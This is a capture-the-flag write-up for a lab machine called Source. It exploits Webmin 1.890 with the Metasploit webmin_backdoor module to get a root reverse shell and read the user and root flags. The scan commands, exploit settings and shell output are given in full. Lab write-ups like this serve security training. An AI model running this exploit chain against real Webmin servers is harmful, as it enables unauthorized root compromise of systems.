# Source CTF Challenge Write-Up

## Overview

This walkthrough documents the compromise of the Source machine, beginning with initial reconnaissance and ending with full root access. The challenge is a relatively straightforward privilege escalation and web application exploitation scenario, centered around an exposed Webmin service on port 10000.

The key finding is that the target is running MiniServ/Webmin 1.890, which contains a known backdoor-style vulnerability. By exploiting the web interface via the `linux/http/webmin_backdoor` Metasploit module, the attacker gains a shell and then retrieves both the user flag and the root flag.

---

## 1. Initial Reconnaissance

### Port Scanning

The first step is to identify which services are listening on the target.

```bash
nmap 10.114.190.96 -sV
```

### Scan Results

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-27 15:46 -0400
Nmap scan report for 10.114.190.96
Host is up (0.087s latency).
Not shown: 998 closed tcp ports (reset)

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
```

The machine exposes two relevant services:

- SSH on port 22
- Webmin on port 10000

The Webmin instance is the primary attack surface.

![Image Placeholder: Nmap scan output](./assets/nmap-scan.png)

---

## 2. Web Enumeration

### Directory Enumeration

We enumerate the HTTP service to confirm the accessible routes and the application structure.

```bash
feroxbuster -u http://10.114.190.96/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

### Observed Result

```text
18456/18456   71/s    http://10.114.190.96:10000/
[####################] - 5m     18456/18456   64/s    http://10.114.190.96:10000/cgi-bin/
[####################] - 5m     18456/18456   64/s    http://10.114.190.96:10000/cgi-bin/cgi-bin/
[####################] - 4m     18456/18456   71/s    http://10.114.190.96:10000/cgi-bin/cgi-bin/cgi-bin/
```

The host is clearly serving Webmin at:

```text
http://10.114.190.96:10000/
```

This is the entry point for the exploitation.

![Image Placeholder: Webmin login page](./assets/webmin-login.png)

---

## 3. Webmin Vulnerability Identification

### Service Version

The service is identified as:

```text
MiniServ 1.890 (Webmin httpd)
```

A known vulnerability is associated with this version:

```text
linux/http/webmin_backdoor
```

This is a well-documented Webmin backdoor-style exploit that allows remote command execution when the vulnerable backend is invoked correctly.

The note explicitly indicates the intended exploit path:

```text
Webmin -> linux/http/webmin_backdoor
set ssl true
set lhost your_ip
set rhost target_ip
run
```

This suggests exploitation through Metasploit and the `webmin_backdoor` module.

> Important: The challenge is not about brute-forcing SSH; the real vulnerability is the Webmin service itself.

![Image Placeholder: Webmin service version](./assets/webmin-version.png)

---

## 4. Exploitation: Webmin Backdoor

### Metasploit Module

The exploit module is:

```bash
use linux/http/webmin_backdoor
```

Then the required values are set:

```bash
set SSL true
set LHOST <attacker_ip>
set RHOSTS 10.114.190.96
run
```

This should produce a command shell on the target system.

### Result

The exploit successfully spawns a remote shell, giving the attacker access to the machine as a privileged or semi-privileged process.

Once the session is active, we can enumerate the filesystem and locate the user flag.

```bash
root@source:/# find / -name user.txt 2>/dev/null
```

### User Flag Location

```text
/home/dark/user.txt
```

The flag is then read:

```bash
root@source:/# cat /home/dark/user.txt
```

This confirms the exploit worked and the attacker can traverse the system.

![Image Placeholder: Reverse shell](./assets/reverse-shell.png)

---

## 5. Post-Exploitation Enumeration

### Determining System State

Once a shell is acquired, we inspect the filesystem and identify the privilege level of the shell.

```bash
id
whoami
ls /root/
```

### Observed Outputs

```text
root@source:/# id
uid=0(root) gid=0(root)

root@source:/# ls /root/
root.txt
```

This indicates the shell is already running as `root`, which means the Webmin exploitation directly resulted in a root-level compromise.

The root flag is readable immediately.

```bash
root@source:/# cat /root/root.txt
```

---

## 6. Final Privilege Level

The challenge is effectively solved at the moment the Webmin backdoor exploit succeeds because the attacker is already operating as root.

This is a strong indication that the service had an exposed unauthenticated or improperly constrained execution path.

```text
root@source:/#
```

The attacker had complete control over the underlying system and could access both:

- `/home/dark/user.txt`
- `/root/root.txt`

---

## 7. Summary of the Exploit Chain

1. Enumerated the target with `nmap`
2. Identified a Webmin service on port 10000
3. Determined the version was MiniServ 1.890
4. Used the `linux/http/webmin_backdoor` exploit against the target
5. Set the required `SSL`, `LHOST`, and `RHOSTS` values
6. Run the exploit to obtain a shell
7. Found the user flag at `/home/dark/user.txt`
8. Confirmed root-level access
9. Read the root flag from `/root/root.txt`

---

## 8. Key Takeaways

- Webmin is a common target for remote exploitation when running outdated or vulnerable versions.
- A known backdoor-style exploit can grant code execution without needing a full application bypass.
- Post-exploitation enumeration is critical for confirming the compromise and locating flags.
- This challenge is a good example of how an exposed management web interface can quickly become a full system compromise if left unpatched.

> Important: The vulnerability is tied to the application layer, but the outcome is full root compromise because the exploit yields a privileged shell.

---

## 9. Relevant Commands

```bash
nmap 10.114.190.96 -sV
feroxbuster -u http://10.114.190.96/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
msfconsole
use linux/http/webmin_backdoor
set SSL true
set LHOST <attacker_ip>
set RHOSTS 10.114.190.96
run
find / -name user.txt 2>/dev/null
cat /home/dark/user.txt
id
ls /root/
cat /root/root.txt
```

---

## Final Result

The Source machine was successfully compromised by exploiting the exposed Webmin instance using the `linux/http/webmin_backdoor` module. The attacker obtained a root shell, retrieved the user flag from `/home/dark/user.txt`, and accessed the root flag at `/root/root.txt`.

![Image Placeholder: Final challenge completion](./assets/final-result.png)

